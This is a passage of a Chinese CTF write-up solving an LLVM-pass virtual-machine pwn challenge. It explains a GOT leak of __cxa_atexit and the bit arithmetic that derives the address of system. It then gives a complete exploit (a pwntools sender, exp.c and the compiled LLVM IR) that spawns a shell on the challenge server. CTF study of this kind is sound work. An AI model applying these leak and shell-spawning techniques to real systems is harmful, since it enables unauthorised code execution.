基于每个opcode，**可以看到op8是一个任意函数执行，同时可以控制rdi**。但是思考如何leak出system函数的地址，可以看到op5可以覆盖reg\[6\],reg\[7\]寄存器的值  
而op7实际上是通过\*(reg\[6\]+offset)来访问，**所以控制了reg\[6\]后就相当于实现了任意地址leak，同时opt文件一般是no pie，所以可以利用opt的got表来leak出libcbase附近的地址**

如图所示可以看到cxa\_atexit函数的地址和libcbase偏移为0x458c0,同时system函数地址和libcbase偏移为0x50D70，所以我们想要通过cxa\_atexit来凑出system函数地址。我们知道libcbase低12位都是0，只有中间13-20位我们不可控。同时题目给了条件是只让做一次0x1000以内的加减法，所以我们可以考虑这样处理

**通过左右位移得到cxa\_atexit的13-20位，也就是0xyy+0x45(这里的0xyy是libcbase本身的随机值)，然后利用op2让其加上0xb，得到0xyy+0x50，这样我们就得到了确定的13-20位的值，然后将其左移12位，再利用op4来或上0xd70，这样就得到了system函数基于libcbase的低20位值。**

然后再将cxa\_atexit右移20位，再左移20位(也就是将低20位清0)，最后再或上刚才得到的值，那么就得到了system的真实地址，这个方法还不需要爆破!!!(除非...，就是0xyy+0x45+0xb产生了进位，但这概率非常非常小，实际打的过程也是一次就通了)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8d7523395723502f6dc990c77a5b9395b1a8ce67.png)

也就是对应下面的步骤

```c
//op7 reg[2]=*(reg[6]+0x68)=&__cxa_atexit 
    _ZN4edoc4loadEhj(op,2,0x68);
    //op5  reg[4]=reg[2]
    _ZN4edoc4movrEhh(op,4,2);
    //op3  把高44位清0
    _ZN4edoc4sftrEhbh(op,2,1,44);
    _ZN4edoc4sftrEhbh(op,2,0,44);
    //op3 把13-20位放到低位
    _ZN4edoc4sftrEhbh(op,2,0,12);
    //op2 0x0458c0  0x50D70 system
    _ZN4edoc4chgrEhi(op,2,0xb);
    //op3 
    _ZN4edoc4sftrEhbh(op,2,1,12);
    //op1 reg[3]=0xd70
    _ZN4edoc4addiEhii(op,3,0xd70,0);
    //op4 reg[2]=reg[2]|reg[3] 得到基于libcbase的system函数的低20位==reg[2]
    _ZN4edoc4borrEhhh(op,2,2,3);

    //op3  reg[4]低20位清0
    _ZN4edoc4sftrEhbh(op,4,0,20);
    _ZN4edoc4sftrEhbh(op,4,1,20);
    //op4  reg[4]=reg[4]|reg[2]=&system
    _ZN4edoc4borrEhhh(op,4,2,4);
```

这个问题解决了后基本就很顺利的来执行system("sh")来getshell了

exp
===

- exp

```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
from ctypes import *
import base64
context(os='linux', arch='amd64', log_level='debug')
# p = process("/home/zp9080/PWN/pwn")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b *$rebase(0x1417)')
p=remote('challenge.yuanloo.com',47308)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
# elf = ELF("/home/zp9080/PWN/pwn")
# libc=elf.libc 

#b *$rebase(0x14F5)
def dbg():
    gdb.attach(p,'b *$rebase(0x109B)')
    pause()

# 读取文件内容
with open('exp.ll', 'rb') as file:
    file_data = file.read()

# 对文件内容进行 Base64 编码
encoded_data = base64.b64encode(file_data)

p.sendlineafter("Please input base64 encoded string (EOF to stop):",encoded_data+b'\nEOF')

p.interactive()

```

- exp.c

```c
#include <stdbool.h>

struct opcode{
    int op0;
} *op;
//之后再把struct.opcode全部替换为class.edoc

void _ZN4edoc4addiEhii(struct opcode *op1,char num,int v1,int v2); //op1  reg[num]=unsigned int(v1+v2)  0<=num<=5
void _ZN4edoc4chgrEhi(struct opcode *op2,char num,int v); //op2  只可以用一次 reg[num]+=v  -4096<v<4096 
void _ZN4edoc4sftrEhbh(struct opcode *op3,char num,bool type,char shift);//op3   type=1:*reg[num]<<shift 或者  type=0:*reg[num]>>shift  0<=num<=5  0<shift<64
void _ZN4edoc4borrEhhh(struct opcode * op4,char a1,char a2,char a3);//op4   reg[a1]=reg[a2]|reg[a3]   a1,a2,a3  0<=x<=5
void _ZN4edoc4movrEhh(struct opcode *op5,char a1,char a2);//op5   reg[a1]=reg[a2]  0<=x<=7  可以涉及到mmap_addr
void _ZN4edoc4saveEhj(struct opcode * op6,char num,int offset);//op6    offset&7==0(8字节对齐)    *(reg[6]+offset)=reg[num]  0<=num<=5
void _ZN4edoc4loadEhj(struct opcode * op7,char num,int offset);//op7    offset&7==0(8字节对齐)     reg[num]=*(reg[6]+offset) 0<=num<=5  offset>=0
void _ZN4edoc4runcEhj(struct opcode * op8,char num,int offset);//op8   func=*(reg[6]+offset)   call func(reg[num])   offset>=0

void _Z10c0deVmMainv()
{
    op->op0 = 0;
    //op5 把mmap_addr存到reg[0]
    _ZN4edoc4movrEhh(op,0,6);
    //op5 把mmap_addr+0x1000存到reg[5]
    _ZN4edoc4movrEhh(op,5,7);

    //op1 reg[1]=0x442000  memcpy
    _ZN4edoc4addiEhii(op,1,0x442000,0);
    //op5 reg[6]=reg[1]=0x442000
    _ZN4edoc4movrEhh(op,6,1);
    //op1 reg[3]=0x443000 绕过check
    _ZN4edoc4addiEhii(op,3,0x443000,0);
    //op5 reg[7]=reg[3]=0x443000
    _ZN4edoc4movrEhh(op,7,3);

    //op7 reg[2]=*(reg[6]+0x68)=&__cxa_atexit 
    _ZN4edoc4loadEhj(op,2,0x68);
    //op5  reg[4]=reg[2]
    _ZN4edoc4movrEhh(op,4,2);
    //op3  把高44位清0
    _ZN4edoc4sftrEhbh(op,2,1,44);
    _ZN4edoc4sftrEhbh(op,2,0,44);
    //op3 把13-20位放到低位
    _ZN4edoc4sftrEhbh(op,2,0,12);
    //op2 0x0458c0  0x50D70 system
    _ZN4edoc4chgrEhi(op,2,0xb);
    //op3 
    _ZN4edoc4sftrEhbh(op,2,1,12);
    //op1 reg[3]=0xd70
    _ZN4edoc4addiEhii(op,3,0xd70,0);
    //op4 reg[2]=reg[2]|reg[3] 得到基于libcbase的system函数的低20位==reg[2]
    _ZN4edoc4borrEhhh(op,2,2,3);

    //op3  reg[4]低20位清0
    _ZN4edoc4sftrEhbh(op,4,0,20);
    _ZN4edoc4sftrEhbh(op,4,1,20);
    //op4  reg[4]=reg[4]|reg[2]=&system
    _ZN4edoc4borrEhhh(op,4,2,4);

    //op5 把mmap_addr存到reg[6]
    _ZN4edoc4movrEhh(op,6,0);
    //op5 把mmap_addr+0x1000存到reg[7]
    _ZN4edoc4movrEhh(op,7,5);
    //op6  *(reg[6]+offset)=&system
    _ZN4edoc4saveEhj(op,4,0);
    //op1  reg[5]=="sh"
    _ZN4edoc4addiEhii(op,5,0x6873,0);
    //op6   *(reg[6]+8)="sh"
    _ZN4edoc4saveEhj(op,5,8);
    //op1  reg[5]=8
    _ZN4edoc4addiEhii(op,5,8,0);
    //op4
    _ZN4edoc4borrEhhh(op,0,0,5);
    //system("sh")
    _ZN4edoc4runcEhj(op,0,0);

}
```

- clang-12 -emit-llvm -S exp.c -o exp.ll后要注意把struct.opcode全部替换为class.edoc(为了过结构体的那个check)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-faab1ba6028f6c7ebfe112ba04c138e3e0ffe7f8.png)

```ll
; ModuleID = 'exp.c'
source_filename = "exp.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%class.edoc = type { i32 }

@op = dso_local global %class.edoc* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @_Z10c0deVmMainv() #0 {
  %1 = load %class.edoc*, %class.edoc** @op, align 8
  %2 = getelementptr inbounds %class.edoc, %class.edoc* %1, i32 0, i32 0
  store i32 0, i32* %2, align 4
  %3 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4movrEhh(%class.edoc* %3, i8 signext 0, i8 signext 6)
  %4 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4movrEhh(%class.edoc* %4, i8 signext 5, i8 signext 7)
  %5 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4addiEhii(%class.edoc* %5, i8 signext 1, i32 4464640, i32 0)
  %6 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4movrEhh(%class.edoc* %6, i8 signext 6, i8 signext 1)
  %7 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4addiEhii(%class.edoc* %7, i8 signext 3, i32 4468736, i32 0)
  %8 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4movrEhh(%class.edoc* %8, i8 signext 7, i8 signext 3)
  %9 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4loadEhj(%class.edoc* %9, i8 signext 2, i32 104)
  %10 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4movrEhh(%class.edoc* %10, i8 signext 4, i8 signext 2)
  %11 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4sftrEhbh(%class.edoc* %11, i8 signext 2, i1 zeroext true, i8 signext 44)
  %12 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4sftrEhbh(%class.edoc* %12, i8 signext 2, i1 zeroext false, i8 signext 44)
  %13 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4sftrEhbh(%class.edoc* %13, i8 signext 2, i1 zeroext false, i8 signext 12)
  %14 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4chgrEhi(%class.edoc* %14, i8 signext 2, i32 11)
  %15 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4sftrEhbh(%class.edoc* %15, i8 signext 2, i1 zeroext true, i8 signext 12)
  %16 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4addiEhii(%class.edoc* %16, i8 signext 3, i32 3440, i32 0)
  %17 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4borrEhhh(%class.edoc* %17, i8 signext 2, i8 signext 2, i8 signext 3)
  %18 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4sftrEhbh(%class.edoc* %18, i8 signext 4, i1 zeroext false, i8 signext 20)
  %19 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4sftrEhbh(%class.edoc* %19, i8 signext 4, i1 zeroext true, i8 signext 20)
  %20 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4borrEhhh(%class.edoc* %20, i8 signext 4, i8 signext 2, i8 signext 4)
  %21 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4movrEhh(%class.edoc* %21, i8 signext 6, i8 signext 0)
  %22 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4movrEhh(%class.edoc* %22, i8 signext 7, i8 signext 5)
  %23 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4saveEhj(%class.edoc* %23, i8 signext 4, i32 0)
  %24 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4addiEhii(%class.edoc* %24, i8 signext 5, i32 26739, i32 0)
  %25 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4saveEhj(%class.edoc* %25, i8 signext 5, i32 8)
  %26 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4addiEhii(%class.edoc* %26, i8 signext 5, i32 8, i32 0)
  %27 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4borrEhhh(%class.edoc* %27, i8 signext 0, i8 signext 0, i8 signext 5)
  %28 = load %class.edoc*, %class.edoc** @op, align 8
  call void @_ZN4edoc4runcEhj(%class.edoc* %28, i8 signext 0, i32 0)
  ret void
}

declare dso_local void @_ZN4edoc4movrEhh(%class.edoc*, i8 signext, i8 signext) #1

declare dso_local void @_ZN4edoc4addiEhii(%class.edoc*, i8 signext, i32, i32) #1

declare dso_local void @_ZN4edoc4loadEhj(%class.edoc*, i8 signext, i32) #1

declare dso_local void @_ZN4edoc4sftrEhbh(%class.edoc*, i8 signext, i1 zeroext, i8 signext) #1

declare dso_local void @_ZN4edoc4chgrEhi(%class.edoc*, i8 signext, i32) #1

declare dso_local void @_ZN4edoc4borrEhhh(%class.edoc*, i8 signext, i8 signext, i8 signext) #1

declare dso_local void @_ZN4edoc4saveEhj(%class.edoc*, i8 signext, i32) #1

declare dso_local void @_ZN4edoc4runcEhj(%class.edoc*, i8 signext, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"Ubuntu clang version 12.0.1-19ubuntu3"}
```

最后成功打通

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-86eb15f942394a2a8aa7f32baff2cb24ded7f330.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8763f1588bd3687946b80280cc6acbd6c3984dc2.png)

后记
--

实际上出题人期望的交互是这样的,这样刚好就有class类了

```cpp
class edoc {
public:
    void addi(unsigned char x, int y, int z) {}              //regs[x] = y + z                    x <= 5
    void chgr(unsigned char x, int y) {}                    //regs[x] += y                        x <= 5            -0x1000 < y < 0x1000    onetime
    void sftr(unsigned char x, bool y, unsigned char z) {}            //y = 1 : regs[x] << z;     y = 0 : regs[x] >> z    x <= 5    y < 0x40
    void borr(unsigned char x, unsigned char y, unsigned char z) {}        //regs[x] = regs[y] | regs[z]                x <= 5  y <= 5  z <= 5
    void movr(unsigned char x, unsigned char y) {}                //regs[x] = regs[y]                    x < 8  y < 8
    void save(unsigned char x, unsigned int  y) {}                //*(y+regs[6]) = regs[x]                x <= 5  y <= 0x1000    y & 7 == 0    regs[6] & 0xFFF = 0    regs[7] = regs[6] + 0x1000
    void load(unsigned char x, unsigned int y) {}                //regs[x] = *(y+regs[6])                x <= 5  y <= 0x1000     y & 7 == 0    regs[6] & 0xFFF = 0    regs[7] = regs[6] + 0x1000
    void runc(unsigned char x, unsigned int  y) {}                //*(y+regs[6])(regs[x])                    x <= 5  y <= 0x1000     y & 7 == 0    regs[6] & 0xFFF = 0    regs[7] = regs[6] + 0x1000
};

edoc obj;

int c0deVmMain() {
    obj.addi(0, 0x442000, 0);    //getenv_got

}
```

同时那些看着很奇怪的函数其实也有自己的含义

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-091aa9d55efb86389815514c217cb57c1fcfd622.png)